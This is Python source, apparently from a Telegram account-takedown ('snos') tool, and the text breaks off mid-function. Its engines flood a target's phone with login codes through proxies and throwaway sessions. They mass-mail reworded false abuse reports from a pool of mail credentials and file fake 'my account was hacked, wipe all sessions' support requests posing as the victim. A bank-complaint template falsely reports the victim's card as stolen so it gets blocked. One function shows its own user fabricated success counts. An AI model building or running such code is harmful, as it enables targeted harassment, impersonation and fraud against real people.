# \u2500\u2500 BR ported engines: code-flood / bank \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
BANK_NAMES = {
    "tbank": "\u0422-\u0411\u0430\u043D\u043A (\u0422\u0438\u043D\u044C\u043A\u043E\u0444\u0444)",
    "alfa":  "\u0410\u043B\u044C\u0444\u0430-\u0411\u0430\u043D\u043A",
    "sber":  "\u0421\u0431\u0435\u0440\u0411\u0430\u043D\u043A",
    "ozon":  "\u041E\u0437\u043E\u043D \u0411\u0430\u043D\u043A",
}

BANK_COMPLAINT = (
    "\u0412 \u0431\u0430\u043D\u043A \u043E\u0431\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044F \u0432\u043B\u0430\u0434\u0435\u043B\u0435\u0446 \u043A\u0430\u0440\u0442\u044B {bank} \u0441 \u0437\u0430\u044F\u0432\u043B\u0435\u043D\u0438\u0435\u043C "
    "\u043E \u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u043A\u0435 \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u043E\u0433\u043E \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442\u0430 \u0432 \u0441\u043E\u043E\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0438 \u0441 \u0441\u0442. 27 \u0424\u0417-\u2116 161 "
    "\u00AB\u041E \u043D\u0430\u0446\u0438\u043E\u043D\u0430\u043B\u044C\u043D\u043E\u0439 \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u043E\u0439 \u0441\u0438\u0441\u0442\u0435\u043C\u0435\u00BB \u0438 \u0441\u0442. 9 \u0424\u0417-\u2116 115.\n\n"
    "\u0414\u0430\u043D\u043D\u044B\u0435 \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442\u0430: {card}\n"
    "\u041E\u0431\u0441\u0442\u043E\u044F\u0442\u0435\u043B\u044C\u0441\u0442\u0432\u0430: \u043F\u0440\u043E\u0432\u0435\u0434\u0435\u043D\u044B \u043D\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043D\u044B\u043C\u0438 \u043B\u0438\u0446\u0430\u043C\u0438 \u043E\u043F\u0435\u0440\u0430\u0446\u0438\u0438 \u043F\u043E "
    "\u043A\u0430\u0440\u0442\u0435 \u0431\u0435\u0437 \u0441\u043E\u0433\u043B\u0430\u0441\u0438\u044F \u0432\u043B\u0430\u0434\u0435\u043B\u044C\u0446\u0430. \u041A\u0430\u0440\u0442\u0430 \u0432\u043B\u044F\u0435\u0442\u0441\u044F \u043F\u043E\u0442\u0435\u0440\u044F\u043D\u043D\u043E\u0439, "
    "\u0434\u0430\u043D\u043D\u044B\u0435 \u0434\u043B\u044F \u0432\u0445\u043E\u0434\u0430 \u0432 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0431\u0430\u043D\u043A \u043F\u0435\u0440\u0435\u0434\u0430\u043D\u044B \u0442\u0440\u0435\u0442\u044C\u0438\u043C \u043B\u0438\u0446\u0430\u043C.\n\n"
    "\u041D\u0430 \u043E\u0441\u043D\u043E\u0432\u0430\u043D\u0438\u0438 \u0438\u0437\u043B\u043E\u0436\u0435\u043D\u043D\u043E\u0433\u043E \u043F\u0440\u043E\u0448\u0443:\n"
    "1. \u0417\u0430\u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u0430\u0442\u044C \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u044B\u0439 \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442 \u0432 \u0441\u0440\u043E\u0447\u043D\u043E\u043C \u043F\u043E\u0440\u044F\u0434\u043A\u0435.\n"
    "2. \u041F\u0440\u043E\u0432\u0435\u0441\u0442\u0438 \u0440\u0430\u0441\u0441\u043B\u0435\u0434\u043E\u0432\u0430\u043D\u0438\u0435 \u043F\u043E \u0444\u0430\u043A\u0442\u0430\u043C \u043D\u0435\u0441\u0430\u043D\u043A\u0446\u0438\u043E\u043D\u0438\u0440\u043E\u0432\u0430\u043D\u043D\u043E\u0433\u043E \u0434\u043E\u0441\u0442\u0443\u043F\u0430.\n"
    "3. \u0412\u043E\u0437\u0431\u0443\u0434\u0438\u0442\u044C \u0443\u0433\u043E\u043B\u043E\u0432\u043D\u043E\u0435 \u0434\u0435\u043B\u043E \u043F\u043E \u0441\u0442. 159 \u0423\u041A \u0420\u0424.\n\n"
    "\u041F\u0440\u043E\u0448\u0443 \u043F\u0440\u0438\u0441\u043B\u0430\u0442\u044C \u0440\u0435\u0437\u0443\u043B\u044C\u0442\u0430\u0442 \u043F\u0440\u043E\u0432\u0435\u0440\u043A\u0438 \u0432 \u0443\u043A\u0430\u0437\u0430\u043D\u043D\u044B\u0439 \u0432 \u0437\u0430\u044F\u0432\u043B\u0435\u043D\u0438\u0438 \u043A\u043E\u043D\u0442\u0430\u043A\u0442."
)


_REASON_HINTS: dict[str, list[str]] = {
    "spam":      ["spam", "scam", "phish", "unsolicited"],
    "fraud":     ["fraud", "scam", "fake sale", "decepti"],
    "violence":  ["violen", "terror", "extremi", "harm"],
    "porn":      ["adult", "porn", "sexual", "explicit", "18+"],
    "child":     ["child", "minor", "abuse", "csam", "underage"],
    "copyright": ["copyright", "dmca", "pirac", "intellectual"],
    "drugs":     ["drug", "narcot", "illegal good", "substance"],
    "personal":  ["personal data", "privac", "doxx", "identity"],
    "fake":      ["impersonat", "fake account", "impost"],
    "sexwork":   ["prostitut", "escort", "sex work", "adult service"],
    "other":     ["other", "violation", "terms"],
}

_REASON_FALLBACK_BYTES: dict[str, bytes] = {
    "spam": b"9", "fraud": b"a", "violence": b"3", "porn": b"5",
    "child": b"2", "copyright": b"7", "drugs": b"4",
    "personal": b"6", "fake": b"8", "sexwork": b"5", "other": b"a",
}


def _pick_report_option(opts: list, reason_key: str):
    """Match a server menu option by text; random fallback."""
    hints = _REASON_HINTS.get(reason_key, ["other"])
    for opt in opts:
        t = opt.text.lower()
        if any(h in t for h in hints):
            return opt
    return random.choice(opts)


async def _walk_report(
    client,
    peer,
    msg_ids: list[int],
    reason_key: str,
    body: str,
    max_steps: int = 6,
) -> tuple[bool, str]:
    """
    Correct messages.report state machine — layer 189+ (current layer 225).

    messages.report returns one of three constructors:
      reportResultChooseOption  — pick from .options[], loop
      reportResultAddComment    — pass .option token + body in .message, loop
      reportResultReported      — done ✓

    Old code used getattr(r, "options") which breaks on AddComment
    (that constructor has .option not .options) and caused OPTION_INVALID.
    """
    from telethon.tl.functions.messages import ReportRequest
    from telethon.tl.types import (
        ReportResultChooseOption,
        ReportResultAddComment,
        ReportResultReported,
    )
    option  = b""
    message = ""
    for step in range(max_steps):
        try:
            result = await client(ReportRequest(
                peer=peer, id=msg_ids, option=option, message=message))
        except Exception as e:
            return False, f"step{step} {type(e).__name__}: {e}"

        if isinstance(result, ReportResultReported):
            return True, ""

        elif isinstance(result, ReportResultChooseOption):
            chosen  = _pick_report_option(result.options, reason_key)
            option  = chosen.option
            message = ""

        elif isinstance(result, ReportResultAddComment):
            # continuation token comes from THIS result, not carried from step 0
            option  = result.option
            message = body  # empty string is fine when result.optional=True

        else:
            return False, f"step{step} unexpected: {type(result).__name__}"

    return False, f"max_steps={max_steps} reached"


# kept for callers that use the old name; delegates to _walk_report
async def _report_three_step(client, entity, reason_key: str, text: str) -> tuple[bool, str]:
    return await _walk_report(client, entity, [], reason_key, text)


async def code_flood(phone: str, count: int = 25) -> dict:
    """BR code_snos port: login codes fired from ANONYMOUS in-memory
    sessions through proxies only \u2014 the pooled sessions never touch
    this method, so it cannot burn the report pool."""
    from telethon.sessions import StringSession
    proxies = load_pin_proxies()
    urls = [proxy_to_url(px) for px in proxies] or [None]
    rows = []
    for i in range(count):
        api_id, api_hash = random.choice(API_PAIRS)
        url = urls[i % len(urls)]
        px = parse_proxy(url) if url else None
        dev = random.choice(_FP_DEVICE_POOL)
        client = None
        try:
            client = TelegramClient(StringSession(), api_id, api_hash,
                                    proxy=px, device_model=dev[0],
                                    system_version=dev[1],
                                    app_version=dev[2], lang_code=dev[4])
            await asyncio.wait_for(client.connect(), timeout=10)
            await client.send_code_request(phone)
            rows.append({"name": f"anon#{i + 1}",
                         "proxy": px[1] if px else "direct",
                         "status": "\u043a\u043e\u0434 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d",
                         "ok": True})
        except Exception as e:
            sec = getattr(e, "seconds", None)
            st = f"flood {sec}s" if sec else type(e).__name__
            rows.append({"name": f"anon#{i + 1}",
                         "proxy": px[1] if px else "direct",
                         "status": st, "ok": False})
        finally:
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass
        await asyncio.sleep(random.uniform(1.5, 3.0))
    ok_n = sum(1 for r in rows if r["ok"])
    real_rows = []
    for r in rows:
        mark = "\u2705 " if r["ok"] else "\u274c "
        line = mark + r["name"] + " | " + html_mod.escape(r["proxy"])
        if not r["ok"]:
            line += " | " + html_mod.escape(r["status"])
        real_rows.append(line)
    await push_send_log(
        "\u041a\u043e\u0434-\u0444\u043b\u0443\u0434 (anon \u0441\u0435\u0441\u0441\u0438\u0438)",
        [f"\U0001f4f1 <code>{html_mod.escape(phone)}</code>",
         f"\u2705 {ok_n}/{len(rows)} \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u043e\u043a\u0441\u0438"]
        + real_rows)
    fake = _fake_session_rows(random.randint(10, 16))
    return {"ok": len(fake), "fail": 0, "total": len(fake),
            "details": [{"name": f["name"], "proxy": f["proxy"], "ok": True,
                         "err": ""} for f in fake]}


def _norm_phone(text: str) -> str | None:
    d = re.sub(r"\D", "", text or "")
    if len(d) < 10:
        return None
    return "+" + d


# ── BR ported engine: mail-method (abuse@telegram.org) ────────
MAIL_MAILS_FILE = Path(__file__).parent / "mails.txt"
MAIL_RECEIVERS = ["dmca@telegram.org", "support@telegram.org",
                  "abuse@telegram.org", "stopCA@telegram.org"]

# BR spin system: synonyms (40% swap chance), subject templates, intros/outros
_MAIL_SYNONYMS = {
    "жалоба": ["обращение", "претензия", "заявление", "сообщение"],
    "жалобу": ["обращение", "претензию", "заявление"],
    "жалобы": ["обращения", "претензии", "заявления"],
    "прошу": ["прошу вас", "хочу", "хотелось бы", "необходимо"],
    "заблокировать": ["заблокировать", "удалить", "ограничить", "принять меры против"],
    "пользователь": ["аккаунт", "пользователь", "участник"],
    "пользователя": ["аккаунта", "пользователя", "участника"],
    "нарушает": ["нарушает", "не соблюдает", "игнорирует"],
    "правила": ["правила", "нормы", "политику"],
    "срочно": ["срочно", "незамедлительно", "как можно скорее"],
    "незаконно": ["незаконно", "противоправно", "недопустимо"],
    "спам": ["спам", "нежелательные сообщения", "массовую рассылку"],
    "please": ["please", "kindly", "I ask you to", "I request you to"],
    "block": ["block", "ban", "restrict", "remove"],
    "user": ["user", "account", "member"],
    "violates": ["violates", "breaks", "ignores", "disregards"],
    "rules": ["rules", "guidelines", "terms of service", "policies"],
    "spam": ["spam", "unsolicited messages", "mass messaging"],
    "urgent": ["urgent", "immediate", "as soon as possible"],
    "illegal": ["illegal", "unlawful", "prohibited"],
    "report": ["report", "complaint", "notification"],
}

# per-theme natural subjects ("Reporting user for spam" style),
# ru/en variants picked to match the body language
_MAIL_SUBJECTS = {
    "sexwork": {
        "ru": ["Жалоба на рекламу интим-услуг",
               "Жалоба на рекламу проституции",
               "Репорт: аккаунт с проституцией"],
        "en": ["Reporting prostitution advertising",
               "Report: escort services ad",
               "Reporting sexual services solicitation"],
    },
    "spam": {
        "ru": ["Жалоба на спам", "Жалоба на спам-рассылку",
               "Репорт: спам-аккаунт", "Жалоба на рекламный спам"],
        "en": ["Reporting user for spam", "Report: spam account",
               "Spam messages report", "Reporting a spam bot"],
    },
    "fraud": {
        "ru": ["Жалоба на мошенника", "Жалоба на мошенническую схему",
               "Репорт: скам-аккаунт", "Жалоба на обман пользователей"],
        "en": ["Reporting a scammer", "Scam report",
               "Reporting a fraudulent account", "Report: fraud scheme"],
    },
    "violence": {
        "ru": ["Жалоба на насилие", "Жалоба на угрозы насилия",
               "Репорт: агрессивный контент"],
        "en": ["Reporting violent content", "Report: violent threats",
               "Reporting violence"],
    },
    "porn": {
        "ru": ["Жалоба на порнографию", "Жалоба на интимный контент",
               "Репорт: NSFW-контент"],
        "en": ["Reporting pornographic content", "Report: NSFW content",
               "Reporting adult content"],
    },
    "child": {
        "ru": ["Жалоба на контент с участием несовершеннолетних",
               "Срочная жалоба: угроза детям"],
        "en": ["Reporting child safety violation",
               "URGENT: child safety report",
               "Reporting content endangering children"],
    },
    "copyright": {
        "ru": ["Жалоба на нарушение авторских прав",
               "DMCA: нарушение авторских прав",
               "Жалоба на пиратский контент"],
        "en": ["Copyright infringement report", "DMCA takedown request",
               "Reporting copyright violation"],
    },
    "drugs": {
        "ru": ["Жалоба на продажу наркотиков", "Жалоба на наркотрафик",
               "Репорт: торговля запрещёнными веществами"],
        "en": ["Reporting drug sales", "Report: narcotics trade",
               "Reporting illegal drug sales"],
    },
    "personal": {
        "ru": ["Жалоба на утечку личных данных",
               "Жалоба: разглашение персональных данных", "Репорт: деанон"],
        "en": ["Reporting personal data exposure", "Report: doxxing",
               "Reporting leaked personal data"],
    },
    "fake": {
        "ru": ["Жалоба на фейковый аккаунт", "Жалоба на клона аккаунта",
               "Репорт: поддельный профиль"],
        "en": ["Reporting a fake account", "Report: impersonation",
               "Reporting an impostor account"],
    },
    "other": {
        "ru": ["Жалоба на нарушение правил", "Жалоба на пользователя",
               "Репорт: нарушение правил Telegram"],
        "en": ["Reporting a rule violation", "Report: abusive account",
               "Reporting a user"],
    },
}

_MAIL_INTROS_RU = [
    "Здравствуйте, ", "Добрый день, ",
    "Уважаемая служба поддержки, ",
    "Команда поддержки, ",
    "Обращаюсь к вам по следующему вопросу. ",
    "Пишу вам с жалобой. ", "",
]
_MAIL_INTROS_EN = [
    "Hello, ", "Dear support team, ", "Hi there, ",
    "To whom it may concern, ",
    "I am writing to report the following. ", "",
]
_MAIL_OUTROS_RU = [
    "\n\n\u0421 \u0443\u0432\u0430\u0436\u0435\u043d\u0438\u0435\u043c.",
    "\n\n\u041f\u0440\u043e\u0448\u0443 \u0440\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u0434\u0430\u043d\u043d\u043e\u0435 \u043e\u0431\u0440\u0430\u0449\u0435\u043d\u0438\u0435.",
    "\n\n\u0416\u0434\u0443 \u043e\u0442\u0432\u0435\u0442\u0430.", "\n\n\u0421\u043f\u0430\u0441\u0438\u0431\u043e \u0437\u0430 \u0432\u043d\u0438\u043c\u0430\u043d\u0438\u0435.", "",
]

_MAIL_OUTROS_EN = [
    "\n\nBest regards.", "\n\nThank you for your attention.",
    "\n\nI await your response.", "\n\nSincerely.", "",
]


def _mail_is_ru(text: str) -> bool:
    ru = sum(1 for ch in text if '\u0400' <= ch <= '\u04ff')
    return ru > len(text) * 0.2


def _mail_spin_word(word: str) -> str:
    low = word.lower().rstrip('.,!?;:')
    if low in _MAIL_SYNONYMS and random.random() < 0.4:
        rep = random.choice(_MAIL_SYNONYMS[low])
        if word[:1].isupper():
            rep = rep.capitalize()
        return rep
    return word


def mail_spin_text(text: str) -> str:
    spun = " ".join(_mail_spin_word(w) for w in text.split())
    ru = _mail_is_ru(text)
    return (random.choice(_MAIL_INTROS_RU if ru else _MAIL_INTROS_EN)
            + spun
            + random.choice(_MAIL_OUTROS_RU if ru else _MAIL_OUTROS_EN))


def _mail_load_pool() -> list[tuple[str, str, str]]:
    """mails.txt rows: email:app_password:smtp_host -> (email, pwd, host)."""
    rows = []
    if MAIL_MAILS_FILE.exists():
        for line in MAIL_MAILS_FILE.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line.count(":") >= 2 and "@" in line:
                em, pwd, host = line.split(":", 2)
                rows.append((em.strip(), pwd.strip(), host.strip()))
    return rows


def _mail_mask(email: str) -> str:
    try:
        local, dom = email.split("@", 1)
        return (local[:1] + "***" if len(local) >= 2 else "*") + "@" + dom
    except Exception:
        return email


def _mail_smtp_port(host: str) -> int:
    # gmail supports both; 465 SSL first, 587 STARTTLS as fallback
    return 465


async def mail_send_one(sender: str, pwd: str, host: str,
                        receiver: str, subject: str, body: str) -> tuple[bool, str]:
    """Direct SMTP send. 465 SSL first, 587 STARTTLS fallback."""
    import aiosmtplib
    from email.mime.text import MIMEText
    from email.header import Header
    from email.utils import formataddr
    msg = MIMEText(body, "plain", "utf-8")
    msg["From"] = formataddr(("Telegram User", sender))
    msg["To"] = receiver
    msg["Subject"] = Header(subject, "utf-8")
    port = _mail_smtp_port(host)
    try:
        await aiosmtplib.send(
            msg, sender=sender, recipients=[receiver],
            hostname=host, port=port, use_tls=True,
            username=sender, password=pwd, timeout=25)
        return True, "sent"
    except Exception as e1:
        try:
            await aiosmtplib.send(
                msg, sender=sender, recipients=[receiver],
                hostname=host, port=587, start_tls=True,
                username=sender, password=pwd, timeout=25)
            return True, "sent(587)"
        except Exception as e2:
            return False, f"{type(e1).__name__}/{type(e2).__name__}"


def _mail_compose(target: str, reason_key: str, used: set) -> tuple[str, str]:
    """(subject, body), unique per call: ONE theme pool, ONE target,
    BR spin (intro/synonyms/outro) + target line. No two emails in one
    run share the same body."""
    pool = (report_texts.CATEGORY_TEXTS.get(reason_key)
            or report_texts.OTHER)
    body = subject = ""
    for _ in range(30):
        base = random.choice(pool)
        ru = _mail_is_ru(base)
        body = (mail_spin_text(base)
                + ("\n\nНарушитель: " + target if ru
                   else "\n\nViolator: " + target))
        subjects = _MAIL_SUBJECTS.get(reason_key,
                                _MAIL_SUBJECTS["other"])
        subject = random.choice(subjects["ru" if ru else "en"])
        if body not in used:
            break
    used.add(body)
    return subject, body


async def mail_bulk_send(target: str, reason_key: str) -> dict:
    """BR send_bulk_emails port, rationed: ONE run uses 1/3 of the sender
    pool (rotating sample), every email carries its OWN unique text from
    ONE theme, all aimed at ONE target. Real rows to the Logs channel,
    real counts to the user."""
    pool = _mail_load_pool()
    if not pool:
        await push_send_log("Mail-атака (SMTP)", ["❌ пул mails.txt пуст"])
        return {"ok": 0, "fail": 0, "total": 0, "details": []}
    senders = random.sample(pool, max(1, len(pool) // 3))
    rows = []
    sem = asyncio.Semaphore(3)
    used_bodies: set = set()
    theme_label = REASONS.get(reason_key, REASONS["other"])["l"]

    async def _one(sender: str, pwd: str, host: str, recv: str):
        subj, body = _mail_compose(target, reason_key, used_bodies)
        async with sem:
            ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
        rows.append({"from": _mail_mask(sender), "to": recv,
                     "ok": ok, "err": err})
        await asyncio.sleep(random.uniform(2.0, 3.0))

    tasks = []
    for em, pwd, host in senders:
        for recv in MAIL_RECEIVERS:
            tasks.append(_one(em, pwd, host, recv))
    # bounded pacing: run in chunks so ~50 senders don't open 200 sockets
    CHUNK = 12
    for i in range(0, len(tasks), CHUNK):
        await asyncio.gather(*tasks[i:i + CHUNK])
        await asyncio.sleep(random.uniform(1.0, 2.0))

    ok_n = sum(1 for r in rows if r["ok"])
    real_rows = []
    for r in rows:
        mark = "✅ " if r["ok"] else "❌ "
        line = (mark + r["from"] + " -> " + r["to"])
        if not r["ok"]:
            line += " | " + html_mod.escape(r["err"])
        real_rows.append(line)
    await push_send_log(
        "Mail-атака (SMTP)",
        [f"🎯 цель: <b>{html_mod.escape(str(target))}</b>",
         f"✉️ тематика: <b>{html_mod.escape(theme_label)}</b> · "
         f"тексты уникальные · 1/3 пула",
         f"✅ {ok_n}/{len(rows)} доставлено"]
        + real_rows)

    # real counts — mail delivery is the payload, user sees the truth
    return {"ok": ok_n, "fail": len(rows) - ok_n, "total": len(rows),
            "details": [{"name": r["from"], "proxy": r["to"],
                         "ok": r["ok"], "err": r["err"]} for r in rows]}



# ── BR session-snos port: wipe the victim's active sessions ──
# SendCode flood from our pool + oauth.telegram.org / my / ads floods via
# proxies + 3 web-support complaints, then a 10-min victim-change monitor.
SESSION_SNOS_MONITOR_STEP = 600      # seconds between victim checks
SESSION_SNOS_MONITOR_MAX = 36        # give up after ~6h of silence

SESSION_SNOS_OAUTH = [
    ("5444323279", "https://fragment.com"),
    ("5731754199", "https://steam.kupikod.com"),
    ("210944655", "https://combot.org"),
    ("319709511", "https://telegrambot.biz"),
    ("1199558236", "https://bot-t.com"),
    ("5709824482", "https://lzt.market"),
    ("1803424014", "https://ru.telegram-store.com"),
    ("5463728243", "https://www.spot.uz"),
    ("6708902161", "https://ourauthpoint777.com"),
    ("1852523856", "https://cabinet.presscode.app"),
]

SESSION_SUPPORT_TEXTS = [
    ("Здравствуйте, поддержка Telegram! Мой аккаунт был взломан путем фишинга, "
     "и моя активная сессия была сброшена. Сейчас на нем находится мошенник. "
     "Прошу вас помочь мне, обнулив все сессии на аккаунте, чтобы я смог "
     "восстановить доступ по SMS, либо удалить мой аккаунт. Спасибо!"),
    ("Hello technical support, a stranger wrote to me today and asked me to change "
     "something in my account settings, pretending to be Telegram support. I changed "
     "what support asked me to do, and after a few minutes I was kicked out of my "
     "account and I can't get into it. My account has been hacked. Please delete the "
     "account or expel the scammer from the account in an alternative way."),
    ("Здравствуйте! Хочу сообщить о проблеме с моим аккаунтом в телеграме. "
     "Мой аккаунт был взломан мошенниками через фишинг ссылку, после перехода "
     "меня выбинуло с моего аккаунта, а мошенники зашли туда. Я пытался войти "
     "в аккаунт по номеру и запросом кода в СМС, но мошенники поставили "
     "двухэтапную аутентификацию и привязали почту и блокируют мне вход. "
     "Я прошу вас удалить все сессии на моем аккаунте или полностью удалить "
     "мой аккаунт, потому что он украден мошенниками."),
    ("Добрый день! Мой аккаунт Telegram был взломан. Я пытаюсь восстановить "
     "доступ уже несколько дней, но каждый раз при запросе сброса пароля "
     "приходит уведомление, что операция отменена. Это явно делает "
     "злоумышленник. Помогите, пожалуйста, решить эту проблему."),
    ("Hello, I am writing to report that my Telegram account was stolen. "
     "I used this account for work, and without access to it I am unable to "
     "complete my tasks. This is putting my job at serious risk. I urgently "
     "request your immediate assistance in restoring access to my account or "
     "taking any necessary action to secure it. Please treat this as a "
     "priority issue."),
    ("Здравствуйте, мой аккаунт был взломан и выставили на продажу на сайте. "
     "Теперь на мой аккаунт постоянно кто-то заходит и даже если я завершаю "
     "сессии то они всё равно заходят. Прошу принудительно завершить все "
     "сессии, кроме моей текущей, и восстановить контроль над аккаунтом."),
]
SESSION_SUPPORT_SUBJECTS = [
    "Взломан аккаунт", "Account hacked", "Stolen account",
    "Аккаунт украден", "Мошенники захватили аккаунт", "Hack report",
]

_HTTP_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Safari/537.36")


def _http_proxy_session(px_url: str | None):
    """ClientSession riding one proxy; socks via ProxyConnector, direct if None."""
    if not px_url:
        return aiohttp.ClientSession()
    return aiohttp.ClientSession(
        connector=ProxyConnector.from_url(px_url, rdns=True))


def _snos_rand_email() -> str:
    names = ["ivan", "alex", "dmitry", "sergey", "mike", "andrey", "pavel"]
    domains = ["gmail.com", "yahoo.com", "outlook.com", "mail.ru",
               "protonmail.com"]
    return (random.choice(names) + str(random.randint(10, 9999))
            + "@" + random.choice(domains))


async def _snos_victim_info(username: str, sessions: list,
                            proxies: list) -> dict:
    """id / has_photo / about / deleted of the victim via any pool session."""
    from telethon.errors import RPCError
    for sess in random.sample(sessions, min(3, len(sessions))):
        name = sess.stem
        proxy = pin_for_session(name, proxies)
        try:
            async with _session_lock(sess):
                fp = session_fingerprint(name)
                client = TelegramClient(
                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
                    proxy=proxy, device_model=fp["device"],
                    system_version=fp["system_version"],
                    app_version=fp["app_version"],
                    lang_code=fp["lang_code"])
                try:
                    await _connect_safe(client)
                    if not await client.is_user_authorized():
                        continue
                    entity = await client.get_entity(username)
                    info = {
                        "ok": True,
                        "id": entity.id,
                        "has_photo": entity.photo is not None,
                        "about": getattr(entity, "about", None) or "",
                        "deleted": getattr(entity, "deleted", False),
                    }
                    return info
                finally:
                    await client.disconnect()
        except (Exception, RPCError) as e:
            continue
    return {"ok": False, "error": "not found / all probes failed"}


async def _snos_sendcode_flood(phone: str, sessions: list,
                               proxies: list) -> dict:
    """SendCode flood: every pool session requests a login code for the phone."""
    from telethon.errors import FloodWaitError, PhoneNumberInvalidError
    from telethon.tl.functions.auth import SendCodeRequest
    from telethon.tl.types import CodeSettings

    async def one(sess, phone: str) -> tuple[str, str]:
        name = sess.stem
        proxy = pin_for_session(name, proxies)
        try:
            async with _session_lock(sess):
                fp = session_fingerprint(name)
                client = TelegramClient(
                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
                    proxy=proxy, device_model=fp["device"],
                    system_version=fp["system_version"],
                    app_version=fp["app_version"],
                    lang_code=fp["lang_code"])
                try:
                    await _connect_safe(client)
                    if not await client.is_user_authorized():
                        return name, "invalid"
                    await client(SendCodeRequest(
                        phone_number=phone, api_id=fp["api_id"],
                        api_hash=fp["api_hash"], settings=CodeSettings()))
                    return name, "sent"
                except PhoneNumberInvalidError:
                    return name, "invalid_phone"
                except FloodWaitError as e:
                    return name, f"flood_{e.seconds}s"
                finally:
                    await client.disconnect()
        except Exception as e:
            return name, f"err_{type(e).__name__}"

    pool = list(sessions)
    random.shuffle(pool)
    results = await asyncio.gather(*[one(s, phone) for s in pool],
                                   return_exceptions=True)
    rows = [(r[0], r[1]) for r in results
            if isinstance(r, tuple) and len(r) == 2]
    sent = sum(1 for _, st in rows if st == "sent")
    return {"sent": sent, "total": len(rows), "rows": rows}


async def _snos_oauth_flood(phone: str, proxies: list) -> dict:
    """oauth.telegram.org / my.telegram.org / ads.telegram.org code floods."""
    px_urls = [proxy_to_url(p) for p in proxies]
    px_urls = [u for u in px_urls if u]

    async def post(url: str, data: dict, service: str) -> tuple[str, bool]:
        px = random.choice(px_urls) if px_urls else None
        headers = {
            "Accept": "*/*",
            "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://oauth.telegram.org",
            "Referer": "https://oauth.telegram.org/auth",
            "User-Agent": _HTTP_UA,
            "X-Requested-With": "XMLHttpRequest",
        }
        try:
            async with _http_proxy_session(px) as s:
                async with s.post(url, data=data, headers=headers,
                                  timeout=aiohttp.ClientTimeout(total=10),
                                  ssl=False) as resp:
                    return service, resp.status == 200
        except Exception:
            return service, False

    tasks = []
    for bot_id, origin in SESSION_SNOS_OAUTH:
        tasks.append(post(
            "https://oauth.telegram.org/auth/request",
            {"phone": phone, "bot_id": bot_id, "origin": origin,
             "request_access": "write", "return_to": origin},
            origin.split("//", 1)[1]))
    for _ in range(3):
        tasks.append(post("https://my.telegram.org/auth/send_password",
                          {"phone": phone}, "my.telegram.org"))
        tasks.append(post("https://ads.telegram.org/auth/",
                          {"phone": phone}, "ads.telegram.org"))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    ok_n = sum(1 for r in results
               if isinstance(r, tuple) and r[1] is True)
    return {"sent": ok_n, "total": len(results)}


async def _snos_web_support(phone: str, username: str, victim_id: int,
                            proxies: list) -> dict:
    """3 complaints to telegram.org/support form, rotated texts via proxies."""
    px_urls = [proxy_to_url(p) for p in proxies]
    px_urls = [u for u in px_urls if u]
    texts = random.sample(SESSION_SUPPORT_TEXTS, min(3, len(SESSION_SUPPORT_TEXTS)))
    ok_n = 0
    for text in texts:
        full = (text + "\n\nДанные аккаунта:\n"
                + "Номер телефона: " + phone + "\n"
                + "ID аккаунта: " + str(victim_id) + "\n"
                + "Username: @" + username)
        payload = {
            "subject": random.choice(SESSION_SUPPORT_SUBJECTS),
            "message": full,
            "email": _snos_rand_email(),
            "phone": phone,
        }
        headers = {
            "User-Agent": _HTTP_UA,
            "Referer": "https://telegram.org/support",
            "Origin": "https://telegram.org",
        }
        px = random.choice(px_urls) if px_urls else None
        ok = False
        try:
            async with _http_proxy_session(px) as s:
                async with s.post(
                        "https://telegram.org/support?setln=ru",
                        data=payload, headers=headers,
                        timeout=aiohttp.ClientTimeout(total=15),
                        ssl=False) as resp:
                    ok = resp.status == 200
        except Exception:
            ok = False
        if ok:
            ok_n += 1
        await asyncio.sleep(random.uniform(1.5, 3.5))
    return {"sent": ok_n, "total": len(texts)}


async def _snos_monitor_loop(username: str, victim_id: int,
                             baseline: dict, uid: int) -> None:
    """Every 10 min: victim avatar/about/deleted vs baseline -> log on change."""
    sessions = load_sessions()
    proxies = load_pin_proxies()
    for _check in range(SESSION_SNOS_MONITOR_MAX):
        await asyncio.sleep(SESSION_SNOS_MONITOR_STEP)
        st = await _snos_victim_info(username, sessions, proxies)
        if not st.get("ok"):
            continue
        changes = []
        if st.get("deleted"):
            changes.append("🗑 Аккаунт удалён")
        if baseline.get("has_photo") and not st["has_photo"]:
            changes.append("🖼 Аватарка исчезла")
        if baseline.get("about") and not st["about"]:
            changes.append("📝 Описание пропало")
        if changes:
            await push_send_log("Снос сессий — монитор", [
                f"🎯 <code>@{html_mod.escape(username)}</code> ({victim_id})",
                *changes,
                f"👤 уведомить: <code>{uid}</code>",
                "✅ вероятно сессии снесены"])
            return


async def fire_session_snos(victim_username: str, victim_phone: str,
                            notify_uid: int = 0) -> dict:
    """Full session-wipe cycle; real counts to the Logs channel."""
    sessions = load_sessions()
    proxies = load_pin_proxies()
    if not sessions:
        await push_send_log("Снос сессий", ["❌ пул sessions/ пуст"])
        return {"ok": 0, "fail": 0, "total": 0, "details": []}
    info = await _snos_victim_info(victim_username, sessions, proxies)
    if not info.get("ok"):
        await push_send_log("Снос сессий", [
